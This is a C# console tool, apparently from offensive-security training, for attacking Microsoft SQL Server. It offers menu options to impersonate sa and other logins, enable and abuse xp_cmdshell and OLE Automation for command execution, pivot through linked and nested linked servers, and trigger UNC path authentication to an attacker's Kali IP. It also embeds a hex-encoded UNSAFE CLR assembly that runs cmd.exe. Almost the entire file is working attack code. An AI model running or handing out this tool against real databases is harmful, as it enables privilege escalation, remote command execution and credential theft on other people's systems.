﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;
using System.Runtime.InteropServices;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("\n=============== MSSQL Server Enumeration ===============\n");
            Console.Write("[*] Enter LHOST (Kali IP): ");
            String IP_Address = Console.ReadLine();
            Console.Write("[*] Enter SQL Server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter Database: ");
            String database = Console.ReadLine() + "\n\n";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);
            con.Open();
            Console.WriteLine("--------------------------------------------------");
            Console.WriteLine("[*] Auth Success!");
            Console.WriteLine("[*] Connected to: " + sqlServer);
            Console.Write("--------------------------------------------------\n\n");

            Console.Write("[*] Number of Linked SQL Servers: ");
            int number_linked_servers = Convert.ToInt32(Console.ReadLine());

            //Initialze linked server array
            string[] linked_servers = new string[number_linked_servers];

            //Populate the linked server array
            for (int i = 0; i < number_linked_servers; i++)
            {
                Console.WriteLine("[*] Enter Linked Server: \n\n");
                linked_servers[i] = Console.ReadLine();
            }

            bool again = true;

            try
            {
                while (again == true)
                {
                    Console.WriteLine("\n\n===== CODE EXECUTION =====\n");
                    Console.WriteLine("[*] 1) UNC Path Injection");
                    Console.WriteLine("[*] 2) Code Exeuction across nested Linked SQL Servers");
                    Console.WriteLine("[*] 3) Code Execution across Linked SQL Servers");
                    Console.WriteLine("[*] 4) Custom Assemblies");
                    Console.WriteLine("[*] 5) Code Execution with SP_OACreate Method");
                    Console.WriteLine("[*] 6) Code Execution with XP_Cmdshell\n");

                    Console.WriteLine("===== ENUMERATION =====\n");
                    Console.WriteLine("[*] 7) Show all logins that can be impersonated");
                    Console.WriteLine("[*] 8) Test for SA Privileges on linked server");
                    Console.WriteLine("[*] 9) Test if your current user can impersonate SA");
                    Console.WriteLine("[*] 10) Test if your current user is a member of the public role and the sysadmin role (With Impersonation)");
                    Console.WriteLine("[*] 11) Enumerate Linked SQL Servers");
                    Console.WriteLine("[*] 12) Custom (Add your own code here)");

                    Console.Write("\nEnter an option (Enter anything else to exit): ");
                    int choice = Convert.ToInt32(Console.ReadLine());

                    Console.WriteLine("\n");

                    //Username is stored in user_payload[0] and payload/command is stored in user_payload[1]
                    String[] user_payload = new string[2];

                    switch (choice)
                    {
                        case 1:
                            Console.WriteLine("[*] unc_path_injection called\n");
                            unc_path_injection(IP_Address);
                            break;
                        case 2:
                            Console.WriteLine("[*] nested_linked_sql_server called\n");
                            getParameters(user_payload);
                            nested_code_execution_linked_sql_servers(user_payload[0], linked_servers[0], linked_servers[1], user_payload[1]);
                            break;
                        case 3:
                            Console.WriteLine("[*] code_execution_linked_sql_server called\n");
                            getParameters(user_payload);
                            code_execution_linked_sql_servers(user_payload[0], user_payload[1], linked_servers[0]);
                            break;
                        case 4:
                            Console.WriteLine("[*] custom_assemblies called\n");
                            Console.WriteLine("Choice: (Reset Database or leave empty)");
                            String custom_choice = Console.ReadLine();
                            getParameters(user_payload);
                            custom_assemblies(custom_choice, user_payload[0], user_payload[1]);
                            break;
                        case 5:
                            Console.WriteLine("[*] sp_oa_method called\n");
                            getParameters(user_payload);
                            sp_oa_method(user_payload[0], user_payload[1]);
                            break;
                        case 6:
                            Console.WriteLine("[*] code_execution_and_xp_cmdshell called\n");
                            getParameters(user_payload);
                            xp_cmdshell_method(user_payload[0], user_payload[1]);
                            break;
                        case 7:
                            Console.WriteLine("[*] all_user_impersonations called\n");
                            all_user_impersonations();
                            break;
                        case 8:
                            Console.WriteLine("[*] test_sa_priv_on_linked_servers called\n");
                            test_sa_priv_on_linked_servers(linked_servers[0]);
                            break;
                        case 9:
                            Console.WriteLine("[*] can_current_user_impersonate_sa called\n");
                            can_current_user_impersonate_sa();
                            break;
                        case 10:
                            Console.WriteLine("[*] is_current_user_member_of_public_sysadmin_role called\n");
                            is_current_user_member_of_public_sysadmin_role();
                            break;
                        case 11:
                            Console.WriteLine("[*] linked_sql_servers called\n");
                            linked_sql_servers();
                            break;
                        case 12:
                            Console.WriteLine("[*] Custom called");
                            custom();
                            break;
                        default:
                            Console.WriteLine("[*] Exiting\n");
                            break;
                    }

                    Console.Write("\n--------------------------------------------------\n\n");
                    Console.Write("Do you want to continue (Y/N): ");
                    String s_again = Console.ReadLine();
                    if (s_again == "Y" || s_again == "y")
                    {
                        again = true;
                        Console.Write("\n");
                    }
                    else
                    {
                        again = false;
                        Console.WriteLine("\nClosing application\n");
                        con.Close();
                    }
                }


                void getParameters(String[] user_payload)
                {
                    Console.Write("Enter user: ");
                    user_payload[0] = Console.ReadLine();
                    Console.Write("Enter a payload: ");
                    user_payload[1] = Console.ReadLine();
                }

                void custom()
                {
                    Console.WriteLine("You havne't added anything...");
                }

                void unc_path_injection(String ip)
                {
                    String query = "EXEC master..xp_dirtree \"\\\\" + ip + "\\\\test\";";
                    SqlCommand command = new SqlCommand(query, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Close();
                }


                void nested_code_execution_linked_sql_servers(String user, String first_linked_server, String second_linked_server, String payload)
                {
                    String executeAs = "EXECUTE AS LOGIN = '" + user + "';";
                    SqlCommand command = new SqlCommand(executeAs, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Close();

                    String enable_advanced_options = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT \"" + first_linked_server + "\"') AT \"" + second_linked_server + "\"";
                    String enable_xpcmd = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT \"" + first_linked_server + "\"') AT \"" + second_linked_server + "\"";
                    String execCmd = "EXEC ('EXEC (''xp_cmdshell ''''" + payload + "'''';'') AT \"" + first_linked_server + "\"') AT \"" + second_linked_server + "\"";
                    command = new SqlCommand(enable_advanced_options, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(enable_xpcmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }

                void code_execution_linked_sql_servers(String user, String payload, String linked_sql_server)
                {
                    String executeAs = "EXECUTE AS LOGIN = '" + user + "';";
                    String enable_advanced_options = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT " + linked_sql_server + "";
                    String enable_xpcmd = "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;')";
                    String execCmd = "EXEC ('xp_cmdshell ''" + payload + "'';')";

                    SqlCommand command = new SqlCommand(executeAs, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(enable_advanced_options, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(enable_xpcmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }


                void custom_assemblies(String choice, String user, String payload)
                {
                    if (choice == "Reset Database")
                    {
                        String dropPro = "DROP PROCEDURE cmdExec;";
                        String dropAssem = "DROP ASSEMBLY myAssembly;";

                        SqlCommand command = new SqlCommand(dropPro, con);
                        SqlDataReader reader = command.ExecuteReader();
                        reader.Close();

                        command = new SqlCommand(dropAssem, con);
                        reader = command.ExecuteReader();
                        reader.Close();
                    }
                    else
                    {
                        String impersonateUser = "EXECUTE AS LOGIN = '" + user + "';";
                        String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0;RECONFIGURE;";
                        String createAsm = "CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000648602006B99BDA50000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000068030000000000000000000000000000000000000000000000000000E4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E746578740000008C0A000000200000000C000000020000000000000000000000000000200000602E72737263000000680300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000D0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000F403000023537472696E67730000000018070000580000002355530070070000100000002347554944000000800700005001000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E0113030600FB0113030600AC00E1020F00330300000600D40077020600710177020600520177020600E20177020600AE0177020600C70177020600010177020600C000F40206009E00F40206003501770206001C012D020600850370020A00EB00C0020A00470242030E006803E1020A006200C0020E009702E10206005D0270020A002000C0020A008E0014000A00D703C0020A008600C0020600A8020A000600B5020A000000000001000000000001000100010010005703000041000100010048200000000096003500620001000921000000008618DB02060002000000010056000900DB0201001100DB0206001900DB020A002900DB0210003100DB0210003900DB0210004100DB0210004900DB0210005100DB0210005900DB0210006100DB0215006900DB0210007100DB0210007900DB0210008900DB0206009900DB020600990089022100A90070001000B1007E032600A90070031000A90019021500A900BC0315009900A3032C00B900DB023000A100DB023800C9007D003F00D100980344009900A9034A00E1003D004F00810051024F00A1005A025300D100E2034400D1004700060099008C0306009900980006008100DB02060020007B0049012E000B0068002E00130071002E001B0090002E00230099002E002B00A6002E003300A6002E003B00A6002E00430099002E004B00AC002E005300A6002E005B00A6002E006300C4002E006B00EE002E007300FB001A000480000001000000000000000000000000003500000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007002000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E6700636D64457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000004215AB5695501B449F4390DFF298F9E000042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000C010007636D6445786563000005010000000017010012436F7079726967687420C2A920203230323100002901002432356161306661342D343761312D343133652D393136342D64376439663238323763356500000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E320401000000000000000000537BBE870000000002000000700000001C2A00001C0C00000000000000000000000000001000000000000000000000000000000052534453AE52A464A334E7499BF0684E31748B25010000005C5C3139322E3136382E3131312E3132385C76697375616C73747564696F5C53514C5F50726F6772616D735C636D64457865635C636D64457865635C6F626A5C7836345C52656C656173655C636D64457865632E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000000C03000000000000000000000C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0046C020000010053007400720069006E006700460069006C00650049006E0066006F0000004802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000380008000100460069006C0065004400650073006300720069007000740069006F006E000000000063006D00640045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000063006D00640045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006D00640045007800650063002E0064006C006C000000300008000100500072006F0064007500630074004E0061006D0065000000000063006D00640045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;";
                        String createPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
                        String execCmd = "EXEC cmdExec '" + payload + "';";

                        SqlCommand command = new SqlCommand(impersonateUser, con);
                        SqlDataReader reader = command.ExecuteReader();
                        reader.Close();

                        command = new SqlCommand(enable_options, con);
                        reader = command.ExecuteReader();
                        reader.Close();

                        command = new SqlCommand(createAsm, con);
                        reader = command.ExecuteReader();
                        reader.Close();

                        command = new SqlCommand(createPro, con);
                        reader = command.ExecuteReader();
                        reader.Close();

                        command = new SqlCommand(execCmd, con);
                        reader = command.ExecuteReader();
                        reader.Read();
                        Console.WriteLine("Result of command is: " + reader[0]);
                        reader.Close();
                    }
                }


                void sp_oa_method(String user, String payload)
                {
                    String impersonateUser = "EXECUTE AS LOGIN = '" + user + "';";
                    String enable_ole = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                    String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, \"cmd /c " + payload + ";";

                    SqlCommand command = new SqlCommand(impersonateUser, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(enable_ole, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();
                }


                void xp_cmdshell_method(String user, String payload)
                {
                    String executeAs = "use msdb; EXECUTE AS USER = '" + user + "';";
                    String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                    String execCmd = "EXEC xp_cmdshell '" + payload + "'";

                    SqlCommand command = new SqlCommand(executeAs, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(enable_xpcmd, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Result of command: " + reader[0]);
                    reader.Close();
                }


                void all_user_impersonations()
                {
                    String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                    SqlCommand command = new SqlCommand(query, con);
                    SqlDataReader reader = command.ExecuteReader();

                    while (reader.Read() == true)
                    {
                        Console.WriteLine("logins that can be impersonated: " + reader[0]);
                    }
                    reader.Close();
                }

                void test_sa_priv_on_linked_servers(String linked_server)
                {
                    String execCmd = "select myuser from openquery(\"" + linked_server + "\", 'select SYSTEM_USER as myuser');";
                    String localCmd = "select SYSTEM_USER;";

                    Console.WriteLine("[*] Before Impersonation");

                    SqlCommand command = new SqlCommand(localCmd, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Executing as login " + reader[0] + " on" + sqlServer);
                    reader.Close();

                    Console.WriteLine("[*] After Impersonation");

                    command = new SqlCommand(execCmd, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Executing as login " + reader[0] + " on " + linked_server);
                    reader.Close();
                }


                void can_current_user_impersonate_sa()
                {
                    String queryUser = "SELECT user_name();";

                    Console.WriteLine("Before impersonation");
                    SqlCommand command = new SqlCommand(queryUser, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Executing in the context of: " + reader[0] + " on " + sqlServer);
                    reader.Close();

                    String executeAs = "use msdb; EXECUTE AS LOGIN = 'sa';";
                    command = new SqlCommand(executeAs, con);
                    reader = command.ExecuteReader();
                    reader.Close();

                    Console.WriteLine("After impersonation");

                    command = new SqlCommand(queryUser, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("Executing in the context of: " + reader[0] + " on " + sqlServer);
                    reader.Close();
                }


                void is_current_user_member_of_public_sysadmin_role()
                {
                    String QueryPublicRole = "SELECT IS_SRVROLEMEMBER('public');";
                    String QuerySysAdminRole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                    String query_user = "SELECT user_name();";


                    SqlCommand command = new SqlCommand(query_user, con);
                    SqlDataReader reader = command.ExecuteReader();
                    reader.Read();
                    Console.WriteLine("User: " + reader[0]);
                    reader.Close();

                    command = new SqlCommand(QueryPublicRole, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Int32 role = Int32.Parse(reader[0].ToString());
                    if (role == 1)
                    {
                        Console.WriteLine("User is a member of public role");
                    }
                    else
                    {
                        Console.WriteLine("User is NOT a member of public role");
                    }
                    reader.Close();

                    command = new SqlCommand(QuerySysAdminRole, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Int32 sys_role = Int32.Parse(reader[0].ToString());
                    if (sys_role == 1)
                    {
                        Console.WriteLine("User is a member of the sysadmin role");
                    }
                    else
                    {
                        Console.WriteLine("User is NOT a member of the sysadmin role");
                    }
                    reader.Close();
                }

                void linked_sql_servers()
                {
                    String execCmd = "EXEC ('sp_linkedservers');";
                    SqlCommand command = new SqlCommand(execCmd, con);
                    SqlDataReader reader = command.ExecuteReader();
                    while (reader.Read())
                    {
                        Console.WriteLine("Linked SQL Server: " + reader[0]);
                    }
                    reader.Close();
                }

                con.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] EXCEPTION: " + e + "\n\n" + "[*] Starting Over!");
                Main(args);
            }
        }
    }
}